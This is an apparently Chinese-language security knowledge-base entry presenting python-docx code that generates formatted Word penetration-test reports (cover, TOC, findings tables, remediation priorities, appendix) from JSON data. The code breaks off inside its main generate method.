---
id: 09-003
title: "📝 安全报告模板 - Word/PDF格式 (Security Report Template - Word/PDF)"
category: 报告撰写
category_en: Reporting
difficulty: ★★★
tools: "python-docx, LibreOffice, Word"
last_updated: 2025-07
tags: ["reporting", "documentation", "cvss", "pentest-report", "markdown"]
subdomain: reporting
nist_csf: ["ID.GV-01", "ID.SC-03"]
mitre_attack: []
---
# 📝 安全报告模板 - Word/PDF格式 (Security Report Template - Word/PDF)

> **版本**: v2.0 | **更新**: 2025-Q1 | **依赖**: python-docx | **输出**: .docx → 可转为 PDF

## 概述

基于 python-docx 的 Word 安全报告自动生成器。支持封面、目录、表格、分页、页眉页脚、页码、颜色标注、超链接等完整特性。生成的 .docx 文件可通过 LibreOffice 或 Microsoft Word 导出为 PDF。

### 模板特性

| 特性 | 说明 |
|:---|:---|
| 📄 完整封面页 | 带品牌色、报告元数据表格 |
| 📑 自动目录 (TOC) | Word 目录域，可自动更新 |
| 🎨 风险等级颜色 | 严重(红)、高危(橙)、中危(黄)、低危(蓝)、信息(灰) |
| 🏷️ 页眉页脚 | 每页含报告编号、密级、页码 |
| 📊 表格样式 | 专业配色、列宽自适应、交替行颜色 |
| 🔗 超链接 | CVE/OWASP 参考可点击 |
| 🤖 AI Agent 原生接口 | 标准 JSON Schema, Python 生成器, 批处理模式 |
| 📦 一键批量生成 | 从扫描结果目录批量生成 Word 报告 |

## 环境准备

```bash
# 安装 python-docx
pip install python-docx

# 可选：安装用于 PDF 转换的工具
# pip install docx2pdf  (需要安装 LibreOffice 或 Word)
# 或使用 LibreOffice 命令行转换:
# libreoffice --headless --convert-to pdf report.docx
```

## Word 报告生成器

```python
#!/usr/bin/env python3
"""
security_report_word_generator.py
Word 安全报告自动生成器 - AI Agent 原生接口

使用 python-docx 生成专业格式的 Word (.docx) 安全评估报告。
支持完整报告结构：封面 → 目录 → 执行摘要 → 范围 → 风险概览 → 漏洞详情 → 修复建议 → 附录
"""

from docx import Document
from docx.shared import Inches, Pt, RGBColor, Cm, Emu
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.enum.section import WD_ORIENT
from docx.oxml.ns import qn, nsdecls
from docx.oxml import parse_xml
import json
import os
import datetime
from typing import Dict, List, Optional


class WordReportGenerator:
    """Word 安全报告生成器"""

    # 颜色方案
    COLORS = {
        "Primary": RGBColor(0x1A, 0x23, 0x7E),       # 深蓝 #1a237e
        "PrimaryLight": RGBColor(0x39, 0x49, 0xAB),   # #3949ab
        "Accent": RGBColor(0x00, 0x89, 0x7B),          # 青绿 #00897b
        "Critical": RGBColor(0xDC, 0x35, 0x45),        # 红
        "High": RGBColor(0xFD, 0x7E, 0x14),            # 橙
        "Medium": RGBColor(0xE6, 0xA8, 0x17),          # 黄
        "Low": RGBColor(0x0D, 0x6E, 0xFD),             # 蓝
        "Info": RGBColor(0x6C, 0x75, 0x7D),             # 灰
        "TableHeader": RGBColor(0x1A, 0x23, 0x7E),      # 表头背景色
        "TableHeaderText": RGBColor(0xFF, 0xFF, 0xFF),  # 表头文字色
        "TableAlt": RGBColor(0xF8, 0xF9, 0xFA),         # 表格交替行背景
        "Text": RGBColor(0x21, 0x25, 0x29),             # 正文色
        "TextMuted": RGBColor(0x6C, 0x75, 0x7D),        # 辅助文字色
        "Code": RGBColor(0xE8, 0xE8, 0xE8),             # 代码块背景
    }

    # 风险等级映射
    SEVERITY_MAP = {
        "Critical": {"icon": "🔴", "label": "严重", "color": COLORS["Critical"]},
        "High": {"icon": "🟠", "label": "高危", "color": COLORS["High"]},
        "Medium": {"icon": "🟡", "label": "中危", "color": COLORS["Medium"]},
        "Low": {"icon": "🔵", "label": "低危", "color": COLORS["Low"]},
        "Info": {"icon": "⚪", "label": "信息", "color": COLORS["Info"]},
    }

    SEVERITY_ORDER = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "Info": 4}

    # 字体设置
    FONT_CN = "Microsoft YaHei"  # 中文字体
    FONT_EN = "Calibri"          # 英文字体
    FONT_MONO = "Cascadia Code"  # 等宽字体

    def __init__(self, company: str = "安全评估团队"):
        self.doc = Document()
        self.company = company
        self._setup_styles()

    def _setup_styles(self):
        """设置文档基础样式"""
        style = self.doc.styles['Normal']
        style.font.name = self.FONT_EN
        style.font.size = Pt(11)
        style.font.color.rgb = self.COLORS["Text"]
        style.paragraph_format.space_after = Pt(6)
        style.paragraph_format.line_spacing = 1.35

        # 设置中文字体
        style.element.rPr.rFonts.set(qn('w:eastAsia'), self.FONT_CN)

        # 设置各级标题样式
        for level, size, bold_color in [
            ('Heading 1', 22, self.COLORS["Primary"]),
            ('Heading 2', 16, self.COLORS["Primary"]),
            ('Heading 3', 13, self.COLORS["Accent"]),
        ]:
            h_style = self.doc.styles[level]
            h_style.font.name = self.FONT_EN
            h_style.font.size = Pt(size)
            h_style.font.bold = True
            h_style.font.color.rgb = bold_color
            h_style.element.rPr.rFonts.set(qn('w:eastAsia'), self.FONT_CN)
            h_style.paragraph_format.space_before = Pt(12)
            h_style.paragraph_format.space_after = Pt(6)

        # 页面设置
        section = self.doc.sections[0]
        section.page_width = Cm(21)
        section.page_height = Cm(29.7)
        section.top_margin = Cm(2.5)
        section.bottom_margin = Cm(2.5)
        section.left_margin = Cm(2.5)
        section.right_margin = Cm(2.5)

    def _add_text(self, text: str, bold: bool = False, size: int = 11,
                  color: Optional[RGBColor] = None, alignment: int = None,
                  font_name: str = None, space_after: int = 6) -> None:
        """添加段落"""
        p = self.doc.add_paragraph()
        if alignment is not None:
            p.alignment = alignment
        p.paragraph_format.space_after = Pt(space_after)
        run = p.add_run(text)
        run.font.name = font_name or self.FONT_EN
        run.element.rPr.rFonts.set(qn('w:eastAsia'), self.FONT_CN)
        run.font.size = Pt(size)
        run.font.bold = bold
        if color:
            run.font.color.rgb = color
        return p

    def _add_code(self, code: str) -> None:
        """添加代码块"""
        for line in code.split('\n'):
            p = self.doc.add_paragraph()
            p.paragraph_format.space_after = Pt(2)
            p.paragraph_format.space_before = Pt(0)
            p.paragraph_format.left_indent = Cm(0.5)
            run = p.add_run(line)
            run.font.name = self.FONT_MONO
            run.font.size = Pt(9)
            run.font.color.rgb = self.COLORS["Text"]

    def _add_bullet(self, text: str, level: int = 0,
                    bold_prefix: str = None) -> None:
        """添加列表项"""
        p = self.doc.add_paragraph(style='List Bullet')
        p.paragraph_format.left_indent = Cm(1.0 + level * 0.5)
        if bold_prefix:
            run = p.add_run(f"{bold_prefix} ")
            run.font.bold = True
            run.font.name = self.FONT_EN
            run.element.rPr.rFonts.set(qn('w:eastAsia'), self.FONT_CN)
        run = p.add_run(text)
        run.font.name = self.FONT_EN
        run.element.rPr.rFonts.set(qn('w:eastAsia'), self.FONT_CN)
        return p

    def _add_table(self, headers: List[str], rows: List[List[str]],
                   col_widths: List[float] = None,
                   header_color: RGBColor = None) -> object:
        """添加格式化表格"""
        table = self.doc.add_table(rows=1 + len(rows), cols=len(headers))
        table.style = 'Table Grid'
        table.alignment = WD_TABLE_ALIGNMENT.CENTER

        # 表头
        header_color = header_color or self.COLORS["TableHeader"]
        for i, header in enumerate(headers):
            cell = table.rows[0].cells[i]
            cell.text = ''
            p = cell.paragraphs[0]
            p.alignment = WD_ALIGN_PARAGRAPH.CENTER
            run = p.add_run(header)
            run.font.bold = True
            run.font.size = Pt(10)
            run.font.name = self.FONT_EN
            run.element.rPr.rFonts.set(qn('w:eastAsia'), self.FONT_CN)
            run.font.color.rgb = self.COLORS["TableHeaderText"]

            # 表头背景色
            shading = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{header_color}"/>')
            cell._tc.get_or_add_tcPr().append(shading)

        # 数据行
        for row_idx, row_data in enumerate(rows):
            for col_idx, cell_text in enumerate(row_data):
                cell = table.rows[row_idx + 1].cells[col_idx]
                cell.text = ''
                p = cell.paragraphs[0]
                run = p.add_run(str(cell_text))
                run.font.size = Pt(10)
                run.font.name = self.FONT_EN
                run.element.rPr.rFonts.set(qn('w:eastAsia'), self.FONT_CN)
                run.font.color.rgb = self.COLORS["Text"]

                # 交替行颜色
                if row_idx % 2 == 1:
                    shading = parse_xml(
                        f'<w:shd {nsdecls("w")} w:fill="{self.COLORS["TableAlt"]}"/>'
                    )
                    cell._tc.get_or_add_tcPr().append(shading)

        # 列宽
        if col_widths:
            for row in table.rows:
                for i, width in enumerate(col_widths):
                    if i < len(row.cells):
                        row.cells[i].width = Cm(width)

        self.doc.add_paragraph()  # 表后间距
        return table

    def _add_severity_badge_paragraph(self, text: str, severity: str) -> None:
        """添加带风险等级颜色的段落"""
        sev = self.SEVERITY_MAP.get(severity, self.SEVERITY_MAP["Info"])
        p = self.doc.add_paragraph()
        run = p.add_run(f"{sev['icon']} [{sev['label']}] {text}")
        run.font.bold = True
        run.font.size = Pt(11)
        run.font.color.rgb = sev["color"]
        run.font.name = self.FONT_EN
        run.element.rPr.rFonts.set(qn('w:eastAsia'), self.FONT_CN)
        return p

    # ==================== 封面 ====================
    def add_cover_page(self, data: Dict) -> None:
        """添加封面页"""
        meta = data.get("report_meta", {})

        # 空行占位
        for _ in range(6):
            self.doc.add_paragraph()

        # 标题
        p = self.doc.add_paragraph()
        p.alignment = WD_ALIGN_PARAGRAPH.CENTER
        run = p.add_run("🛡️ 安全评估报告")
        run.font.size = Pt(28)
        run.font.bold = True
        run.font.color.rgb = self.COLORS["Primary"]
        run.font.name = self.FONT_EN
        run.element.rPr.rFonts.set(qn('w:eastAsia'), self.FONT_CN)

        # 副标题
        p = self.doc.add_paragraph()
        p.alignment = WD_ALIGN_PARAGRAPH.CENTER
        run = p.add_run("Security Assessment Report")
        run.font.size = Pt(14)
        run.font.color.rgb = RGBColor(0x64, 0x74, 0x8B)

        self.doc.add_paragraph()

        # 元数据表
        today = meta.get("report_date", str(datetime.date.today()))
        meta_data = [
            ("报告编号", meta.get("report_id", "REP-2024-XXX")),
            ("项目编号", meta.get("project_id", "PT-2024-XXX")),
            ("客户名称", meta.get("client_name", "")),
            ("测试时间", f"{meta.get('test_start', '')} 至 {meta.get('test_end', '')}"),
            ("文档版本", meta.get("version", "v1.0")),
            ("编制人", meta.get("tester", "")),
            ("审核人", meta.get("reviewer", "")),
            ("批准人", meta.get("approver", "")),
            ("发布日期", today),
            ("文档密级", f"🔒 {meta.get('classification', '机密')}"),
        ]
        rows = [[k, v] for k, v in meta_data]
        tbl = self._add_table(["项目", "内容"], rows, col_widths=[4, 10])
        tbl.alignment = WD_TABLE_ALIGNMENT.CENTER

        self.doc.add_paragraph()

        # 底部提示
        p = self.doc.add_paragraph()
        p.alignment = WD_ALIGN_PARAGRAPH.CENTER
        run = p.add_run(f"测试单位：{self.company}")
        run.font.size = Pt(10)
        run.font.color.rgb = self.COLORS["TextMuted"]
        run.font.name = self.FONT_EN
        run.element.rPr.rFonts.set(qn('w:eastAsia'), self.FONT_CN)

        self.doc.add_page_break()

    # ==================== 目录 ====================
    def add_toc(self) -> None:
        """添加自动目录"""
        p = self.doc.add_paragraph()
        p.alignment = WD_ALIGN_PARAGRAPH.CENTER
        run = p.add_run("目 录")
        run.font.size = Pt(18)
        run.font.bold = True
        run.font.color.rgb = self.COLORS["Primary"]
        run.font.name = self.FONT_EN
        run.element.rPr.rFonts.set(qn('w:eastAsia'), self.FONT_CN)

        self.doc.add_paragraph()

        # 插入 Word TOC 域
        p = self.doc.add_paragraph()
        run = p.add_run()
        fld_char_begin = parse_xml(
            f'<w:fldChar {nsdecls("w")} w:fldCharType="begin"/>'
        )
        run._r.append(fld_char_begin)

        run2 = p.add_run()
        instr = parse_xml(
            f'<w:instrText {nsdecls("w")} xml:space="preserve"> TOC \\o "1-3" \\h \\z \\u </w:instrText>'
        )
        run2._r.append(instr)

        run3 = p.add_run()
        fld_char_separate = parse_xml(
            f'<w:fldChar {nsdecls("w")} w:fldCharType="separate"/>'
        )
        run3._r.append(fld_char_separate)

        run4 = p.add_run("（请在 Word 中右键此处 → 更新域 以生成目录）")
        run4.font.size = Pt(10)
        run4.font.color.rgb = self.COLORS["TextMuted"]
        run4.font.name = self.FONT_EN
        run4.element.rPr.rFonts.set(qn('w:eastAsia'), self.FONT_CN)

        run5 = p.add_run()
        fld_char_end = parse_xml(
            f'<w:fldChar {nsdecls("w")} w:fldCharType="end"/>'
        )
        run5._r.append(fld_char_end)

        self.doc.add_page_break()

    # ==================== 页眉页脚 ====================
    def _add_header_footer(self, data: Dict) -> None:
        """添加页眉页脚"""
        meta = data.get("report_meta", {})
        classification = meta.get("classification", "机密")
        report_id = meta.get("report_id", "REP-2024-XXX")

        # 页眉
        header = self.doc.sections[0].header
        header.is_linked_to_previous = False
        hp = header.paragraphs[0]
        hp.text = ""
        run = hp.add_run(f"🔒 {classification}  |  {report_id}  |  {meta.get('client_name', '')}")
        run.font.size = Pt(8)
        run.font.color.rgb = self.COLORS["TextMuted"]
        run.font.name = self.FONT_EN
        run.element.rPr.rFonts.set(qn('w:eastAsia'), self.FONT_CN)

        # 页脚 - 页码
        footer = self.doc.sections[0].footer
        footer.is_linked_to_previous = False
        fp = footer.paragraphs[0]
        fp.alignment = WD_ALIGN_PARAGRAPH.CENTER
        fp.text = ""

        # "第 X 页 / 共 Y 页"
        run = fp.add_run("第 ")
        run.font.size = Pt(8)

        fld_char_begin = parse_xml(
            f'<w:fldChar {nsdecls("w")} w:fldCharType="begin"/>'
        )
        run2 = fp.add_run()
        run2._r.append(fld_char_begin)

        instr = parse_xml(
            f'<w:instrText {nsdecls("w")} xml:space="preserve"> PAGE </w:instrText>'
        )
        run3 = fp.add_run()
        run3._r.append(instr)

        fld_char_separate = parse_xml(
            f'<w:fldChar {nsdecls("w")} w:fldCharType="separate"/>'
        )
        run4 = fp.add_run()
        run4._r.append(fld_char_separate)

        run5 = fp.add_run("1")
        run5.font.size = Pt(8)

        fld_char_end = parse_xml(
            f'<w:fldChar {nsdecls("w")} w:fldCharType="end"/>'
        )
        run6 = fp.add_run()
        run6._r.append(fld_char_end)

        run7 = fp.add_run(" 页 / 共 ")
        run7.font.size = Pt(8)

        fld_char_begin2 = parse_xml(
            f'<w:fldChar {nsdecls("w")} w:fldCharType="begin"/>'
        )
        run8 = fp.add_run()
        run8._r.append(fld_char_begin2)

        instr2 = parse_xml(
            f'<w:instrText {nsdecls("w")} xml:space="preserve"> NUMPAGES </w:instrText>'
        )
        run9 = fp.add_run()
        run9._r.append(instr2)

        fld_char_separate2 = parse_xml(
            f'<w:fldChar {nsdecls("w")} w:fldCharType="separate"/>'
        )
        run10 = fp.add_run()
        run10._r.append(fld_char_separate2)

        run11 = fp.add_run("1")
        run11.font.size = Pt(8)

        fld_char_end2 = parse_xml(
            f'<w:fldChar {nsdecls("w")} w:fldCharType="end"/>'
        )
        run12 = fp.add_run()
        run12._r.append(fld_char_end2)

        run13 = fp.add_run(" 页")
        run13.font.size = Pt(8)

    # ==================== 执行摘要 ====================
    def add_executive_summary(self, data: Dict) -> None:
        """添加执行摘要"""
        self.doc.add_heading('1. 执行摘要', level=1)

        summary = data.get("executive_summary", {})
        meta = data.get("report_meta", {})
        total = summary.get("total_findings", 0)
        critical = summary.get("critical_count", 0)
        high = summary.get("high_count", 0)
        medium = summary.get("medium_count", 0)
        low = summary.get("low_count", 0)
        info = summary.get("info_count", 0)

        # 测试概况
        self.doc.add_heading('1.1 测试概况', level=2)
        overview = [
            ("客户名称", meta.get("client_name", "")),
            ("测试周期", f"{meta.get('test_start', '')} 至 {meta.get('test_end', '')}"),
            ("测试人员", meta.get("tester", "")),
            ("测试目标数", f"{len(data.get('scope', {}).get('targets', []))} 个"),
        ]
        self._add_table(["项目", "内容"], overview, col_widths=[4, 10])

        # 总体风险评估
        self.doc.add_heading('1.2 总体风险评估', level=2)
        severity_rows = [
            [f"🔴 严重 (Critical)", str(critical)],
            [f"🟠 高危 (High)", str(high)],
            [f"🟡 中危 (Medium)", str(medium)],
            [f"🔵 低危 (Low)", str(low)],
            [f"⚪ 信息 (Info)", str(info)],
            ["合计", str(total)],
        ]
        self._add_table(["风险等级", "数量"], severity_rows, col_widths=[6, 4])

        risk_level = summary.get("risk_level", "N/A")
        self._add_text(f"综合风险评级：{risk_level}", bold=True, size=12,
                       color=self.COLORS["Primary"])

        # 测试概述文本
        overview_text = summary.get("overview", "")
        if overview_text:
            self._add_text(overview_text)

        # 关键发现
        self.doc.add_heading('1.3 关键发现', level=2)
        key_findings = summary.get("key_findings", [])
        if key_findings:
            kf_rows = []
            for i, kf in enumerate(key_findings, 1):
                sev = kf.get("severity", "Info")
                sev_label = self.SEVERITY_MAP.get(sev, self.SEVERITY_MAP["Info"])
                kf_rows.append([
                    str(i),
                    f"{sev_label['icon']}[{sev_label['label']}]",
                    kf.get("title", ""),
                    kf.get("impact", ""),
                ])
            self._add_table(
                ["#", "风险", "漏洞名称", "影响说明"],
                kf_rows,
                col_widths=[1, 2.5, 4.5, 6],
            )

        self.doc.add_page_break()

    # ==================== 测试范围 ====================
    def add_scope(self, data: Dict) -> None:
        """添加测试范围与测试方法"""
        self.doc.add_heading('2. 测试范围与方法', level=1)

        scope = data.get("scope", {})

        # 在测范围
        self.doc.add_heading('2.1 测试范围', level=2)
        targets = scope.get("targets", [])
        if targets:
            scope_rows = [
                [str(i+1), t.get("url", ""), t.get("type", ""),
                 t.get("methodology", "")]
                for i, t in enumerate(targets)
            ]
            self._add_table(
                ["#", "目标", "类型", "测试方法"],
                scope_rows,
                col_widths=[1, 6, 3, 3],
            )

        # 测试方法
        self.doc.add_heading('2.2 测试方法', level=2)
        method_rows = [
            ["1. 信息收集", "子域名枚举、端口扫描、技术栈识别", "Sublist3r, Nmap, WhatWeb"],
            ["2. 漏洞扫描", "自动化漏洞扫描 + 手动验证", "Nuclei, Burp Suite"],
            ["3. 手动测试", "深度手工测试，业务逻辑测试", "Burp Suite Repeater/Intruder"],
            ["4. 漏洞验证", "确认漏洞可被利用，评估影响范围", "自定义PoC, Metasploit"],
            ["5. 报告编制", "整理发现、评级、修复建议", "本报告模板"],
        ]
        self._add_table(["阶段", "活动描述", "工具/技术"], method_rows)

        # 遵循标准
        self.doc.add_heading('2.3 遵循标准', level=2)
        standards = [
            ("PTES (渗透测试执行标准)", "全流程框架"),
            ("OWASP Testing Guide v4.2", "Web应用测试用例"),
            ("OWASP API Security Top 10", "API安全测试"),
            ("NIST SP 800-115", "技术测试指南"),
            ("CVSS 3.1 / 4.0", "漏洞评分"),
            ("CWE / CAPEC", "弱点分类"),
        ]
        self._add_table(["标准", "应用环节"], standards, col_widths=[8, 5])

        self.doc.add_page_break()

    # ==================== 风险分布 ====================
    def add_risk_overview(self, data: Dict) -> None:
        """添加风险分布概览"""
        self.doc.add_heading('3. 风险分布概览', level=1)

        summary = data.get("executive_summary", {})
        total = summary.get("total_findings", 0)
        findings = data.get("findings", [])

        # 严重性分布
        self.doc.add_heading('3.1 漏洞严重性分布', level=2)
        sev_data = {
            "Critical": summary.get("critical_count", 0),
            "High": summary.get("high_count", 0),
            "Medium": summary.get("medium_count", 0),
            "Low": summary.get("low_count", 0),
            "Info": summary.get("info_count", 0),
        }
        sev_rows = []
        for sev_key, sev_count in sev_data.items():
            sev_info = self.SEVERITY_MAP.get(sev_key, self.SEVERITY_MAP["Info"])
            pct = f"{sev_count / total * 100:.1f}%" if total > 0 else "0%"
            bar = "█" * max(1, int(sev_count / max(1, total) * 20))
            sev_rows.append([
                f"{sev_info['icon']} {sev_info['label']} ({sev_key})",
                str(sev_count),
                pct,
                bar,
            ])
        sev_rows.append(["合计", str(total), "100%", "█" * 20])
        self._add_table(
            ["风险等级", "数量", "占比", "图示"],
            sev_rows,
            col_widths=[4.5, 1.5, 1.5, 6],
        )

        # 漏洞类型分布
        self.doc.add_heading('3.2 漏洞类型分布', level=2)
        type_counts = {}
        for f in findings:
            vtype = f.get("vuln_type", "其他")
            type_counts[vtype] = type_counts.get(vtype, 0) + 1
        type_rows = [
            [vtype, str(count), f"{count / max(1, total) * 100:.1f}%"]
            for vtype, count in sorted(
                type_counts.items(), key=lambda x: -x[1]
            )
        ]
        if type_rows:
            self._add_table(["漏洞类型", "数量", "占比"], type_rows)

        # 受影响系统分布
        self.doc.add_heading('3.3 受影响系统分布', level=2)
        systems = data.get("systems", [])
        if systems:
            sys_rows = []
            sys_totals = [0, 0, 0, 0]
            for sys in systems:
                sys_totals[0] += sys.get("critical", 0)
                sys_totals[1] += sys.get("high", 0)
                sys_totals[2] += sys.get("medium", 0)
                sys_totals[3] += sys.get("low", 0)
                row_total = sum(sys.get(k, 0) for k in ["critical", "high", "medium", "low"])
                sys_rows.append([
                    sys.get("name", ""),
                    str(sys.get("critical", 0)),
                    str(sys.get("high", 0)),
                    str(sys.get("medium", 0)),
                    str(sys.get("low", 0)),
                    str(row_total),
                ])
            sys_rows.append([
                "合计",
                str(sys_totals[0]),
                str(sys_totals[1]),
                str(sys_totals[2]),
                str(sys_totals[3]),
                str(sum(sys_totals)),
            ])
            self._add_table(
                ["系统/组件", "严重", "高危", "中危", "低危", "合计"],
                sys_rows,
            )

        self.doc.add_page_break()

    # ==================== 漏洞详情 ====================
    def add_findings(self, data: Dict) -> None:
        """添加漏洞详情"""
        self.doc.add_heading('4. 漏洞详情', level=1)

        findings = data.get("findings", [])
        findings_sorted = sorted(
            findings,
            key=lambda f: self.SEVERITY_ORDER.get(f.get("severity", "Info"), 99),
        )

        for idx, finding in enumerate(findings_sorted, 1):
            sev = finding.get("severity", "Medium")
            sev_info = self.SEVERITY_MAP.get(sev, self.SEVERITY_MAP["Medium"])
            title = finding.get("title", "未命名漏洞")
            cvss = finding.get("cvss_score", "N/A")
            cvss_vec = finding.get("cvss_vector", "")
            cve = finding.get("cve_id", "N/A")
            cwe = finding.get("cwe_id", "N/A")
            owasp = finding.get("owasp_category", "N/A")
            component = finding.get("affected_component", "N/A")
            vuln_type = finding.get("vuln_type", "N/A")
            status = finding.get("status", "未修复")
            description = finding.get("description", "无描述")

            # 漏洞标题
            self.doc.add_heading(
                f'{idx}.{idx} {sev_info["icon"]} [{sev_info["label"]}] {title}',
                level=2,
            )

            # 基本信息表
            info_rows = [
                ["漏洞编号", finding.get("id", "VULN-XXX")],
                ["CVE编号", cve],
                [f"CVSS {finding.get('cvss_version', '3.1')}", f"{cvss} ({cvss_vec})"],
                ["风险等级", f'{sev_info["icon"]} {sev_info["label"]} ({sev})'],
                ["发现日期", finding.get("discovered_date", "YYYY-MM-DD")],
                ["受影响组件", component],
                ["漏洞类型", vuln_type],
                ["OWASP 分类", owasp],
                ["CWE 编号", cwe],
                ["当前状态", status],
            ]
            self._add_table(["字段", "值"], info_rows, col_widths=[3.5, 10])

            # 漏洞描述
            self.doc.add_heading('漏洞描述', level=3)
            self._add_text(description)

            # 复现步骤
            steps = finding.get("reproduction_steps", [])
            if steps:
                self.doc.add_heading('复现步骤', level=3)
                for step in steps:
                    self._add_bullet(step)

            # POC
            poc = finding.get("poc", {})
            if isinstance(poc, dict) and poc.get("content"):
                self.doc.add_heading(
                    f"POC {'请求' if poc.get('type') == 'http_request' else '代码'}",
                    level=3,
                )
                self._add_code(poc["content"])

            # 影响范围
            self.doc.add_heading('影响范围', level=3)
            self._add_text(finding.get("impact", "无"))

            # 修复建议
            self.doc.add_heading('修复建议', level=3)
            remediation = finding.get("remediation", {})
            if isinstance(remediation, dict):
                if remediation.get("short_term"):
                    self._add_bullet(
                        remediation["short_term"],
                        bold_prefix="短期修复：",
                    )
                if remediation.get("long_term"):
                    self._add_bullet(
                        remediation["long_term"],
                        bold_prefix="长期修复：",
                    )
                if remediation.get("priority") or remediation.get("deadline"):
                    priority = remediation.get("priority", "N/A")
                    deadline = remediation.get("deadline", "N/A")
                    self._add_text(f"优先级：{priority}  |  修复期限：{deadline}",
                                   bold=True, size=10)

            # 参考资源
            refs = finding.get("references", [])
            if refs:
                self.doc.add_heading('参考资源', level=3)
                for ref in refs:
                    self._add_bullet(ref)

            # 分隔符（除最后一项外）
            if idx < len(findings_sorted):
                self.doc.add_paragraph("—" * 50)

        self.doc.add_page_break()

    # ==================== 修复建议 ====================
    def add_remediation(self, data: Dict) -> None:
        """添加修复建议汇总"""
        self.doc.add_heading('5. 修复建议汇总', level=1)

        findings = data.get("findings", [])
        findings_sorted = sorted(
            findings,
            key=lambda f: self.SEVERITY_ORDER.get(f.get("severity", "Info"), 99),
        )

        # 按优先级排序
        self.doc.add_heading('5.1 按优先级排序', level=2)

        deadline_map = {
            "Critical": "24小时内", "High": "1周内",
            "Medium": "2周内", "Low": "1个月内", "Info": "1个月内",
        }
        priority_map = {
            "Critical": "P0 🔴", "High": "P1 🟠",
            "Medium": "P2 🟡", "Low": "P3 🔵", "Info": "P3 🔵",
        }

        rem_rows = []
        for f in findings_sorted:
            sev = f.get("severity", "Medium")
            rem_rows.append([
                priority_map.get(sev, "P2 🟡"),
                f.get("id", ""),
                f.get("title", ""),
                str(f.get("cvss_score", "N/A")),
                deadline_map.get(sev, "N/A"),
            ])
        if rem_rows:
            self._add_table(
                ["优先级", "漏洞编号", "漏洞名称", "CVSS", "修复期限"],
                rem_rows,
                col_widths=[2, 2.5, 5, 1.5, 2.5],
            )

        # 优先级定义
        self.doc.add_heading('5.2 优先级定义', level=2)
        priority_defs = [
            ["P0 🔴", "紧急", "可被远程利用且造成严重业务影响", "24小时内启动修复"],
            ["P1 🟠", "高", "可能造成较严重的业务/数据影响", "1周内修复"],
            ["P2 🟡", "中", "需一定条件才能利用", "2周内修复"],
            ["P3 🔵", "低", "信息泄露或最佳实践改进", "1个月内修复"],
        ]
        self._add_table(
            ["优先级", "等级", "定义", "响应要求"],
            priority_defs,
            col_widths=[2, 1.5, 5, 5],
        )

        self.doc.add_page_break()

    # ==================== 复测结果 ====================
    def add_retest(self, data: Dict) -> None:
        """添加复测结果"""
        self.doc.add_heading('6. 复测结果', level=1)

        findings = data.get("findings", [])
        self.doc.add_heading('6.1 复测明细', level=2)

        retest_rows = []
        for f in findings:
            retest = f.get("retest", {})
            first = retest.get("first_round", {}) if isinstance(retest, dict) else {}
            first_status = first.get("status", "⏳ 待复测") if first else "⏳ 待复测"
            sev = f.get("severity", "Medium")
            sev_info = self.SEVERITY_MAP.get(sev, self.SEVERITY_MAP["Medium"])
            retest_rows.append([
                f.get("id", ""),
                f.get("title", ""),
                f'{sev_info["icon"]} {sev_info["label"]}',
                first_status,
            ])
        if retest_rows:
            self._add_table(
                ["漏洞编号", "漏洞名称", "原风险", "首次复测状态"],
                retest_rows,
            )

    # ==================== 附录 ====================
    def add_appendix(self, data: Dict) -> None:
        """添加附录"""
        self.doc.add_heading('附录', level=1)

        # 工具清单
        self.doc.add_heading('附录 A：测试工具清单', level=2)
        tools = data.get("methodology", {}).get("tools", [])
        if tools:
            tool_rows = [
                [t.get("name", ""), t.get("version", ""), t.get("purpose", "")]
                for t in tools
            ]
        else:
            tool_rows = [
                ["Burp Suite Professional", "2024.x", "HTTP代理、手动测试"],
                ["Nuclei", "3.x", "自动化漏洞扫描"],
                ["SQLMap", "1.8.x", "SQL注入检测与利用"],
                ["Nmap", "7.9x", "端口/服务发现"],
                ["Sublist3r", "2.x", "子域名枚举"],
            ]
        self._add_table(
            ["工具", "版本", "用途"],
            tool_rows,
            col_widths=[4, 2, 7],
        )

        # 术语表
        self.doc.add_heading('附录 B：术语表', level=2)
        glossary = [
            ["POC", "Proof of Concept", "概念验证，证明漏洞存在的代码或请求"],
            ["CVSS", "Common Vulnerability Scoring System", "通用漏洞评分系统"],
            ["CVE", "Common Vulnerabilities and Exposures", "通用漏洞与暴露"],
            ["CWE", "Common Weakness Enumeration", "通用弱点枚举"],
            ["OWASP", "Open Web Application Security Project", "开放Web应用安全项目"],
            ["PTES", "Penetration Testing Execution Standard", "渗透测试执行标准"],
            ["RCE", "Remote Code Execution", "远程代码执行"],
            ["SSRF", "Server-Side Request Forgery", "服务端请求伪造"],
            ["XSS", "Cross-Site Scripting", "跨站脚本攻击"],
            ["CSRF", "Cross-Site Request Forgery", "跨站请求伪造"],
            ["IDOR", "Insecure Direct Object Reference", "不安全直接对象引用"],
            ["WAF", "Web Application Firewall", "Web应用防火墙"],
        ]
        self._add_table(["缩写", "全称", "说明"], glossary, col_widths=[2, 5, 6])

        # 免责声明
        self.doc.add_heading('附录 C：免责声明', level=2)
        disclaimers = [
            "1. 本报告仅对测试期间指定的范围、条件及时间节点有效，不保证覆盖所有可能的安全隐患。",
            "2. 测试结果基于测试期间使用的工具和技术手段，新的攻击手法或漏洞可能不在本次测试覆盖范围内。",
            "3. 修复建议仅供参考，具体实施需结合业务实际情况、系统架构和技术可行性进行评估。",
            "4. 本报告包含敏感安全信息，未经授权不得向第三方披露本报告的全部或部分内容。",
            "5. 测试单位对因使用本报告中的信息或建议而产生的任何直接或间接损失不承担责任。",
        ]
        for d in disclaimers:
            self._add_text(d, size=10, space_after=4)

    # ==================== 主构建方法 ====================
    def generate(self, data: Dict, output_path: str = "security_report.docx",
                 sections: List[str] = None) -> str:
        """
        生成完整 Word 报告

        参数:
            data: 符合标准 JSON Schema 的报告数据
            output_path: 输出文件路径
            sections: 包含的章节列表 (None=全部)

        返回:
            str: 输出文件路径
        """
        default_sections = [
            "cover", "toc", "executive", "scope", "risk_overview",
            "findings", "remediation", "retest", "appendix",
        ]
        sections = sections or default_sections

        # 添加页眉页脚
        self._add_header_footer(data)

        # 按顺序添加各章节
        section_builders = {
            "cover": lambda: self.add_cover_page(data),
            "toc": self.add_toc,
            "executive": lambda: self.add_executive_summary(data),
            "scope": lambda: self.add_scope(data),
            "risk_overview": lambda: self.add_risk_overview(data),
            "findings": lambda: self.add_findings(data),
            "remediation": lambda: self.add_remediation(data),
